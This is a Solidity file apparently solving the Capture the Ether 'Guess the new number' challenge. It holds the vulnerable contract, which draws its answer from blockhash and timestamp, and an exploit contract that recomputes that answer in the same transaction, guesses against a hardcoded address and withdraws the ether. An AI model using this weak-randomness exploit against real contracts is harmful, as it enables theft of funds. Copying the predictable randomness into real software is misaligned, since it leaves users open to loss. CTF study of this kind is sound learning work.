pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract GuessTheNewNumberExploit {
    address owner;
    
    function() public payable {}
    
    function GuessTheNewNumberExploit() public payable {
        require(msg.value == 1 ether);
        owner = msg.sender;
    }

    function withdraw() public {
        owner.transfer(address(this).balance);
    }

    function exploit() public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        GuessTheNewNumberChallenge s = GuessTheNewNumberChallenge(0xeFF560BF7977C5a45f82Fd4a1B6e8e32988ab837);
        s.guess.value(1 ether)(answer);
    }
}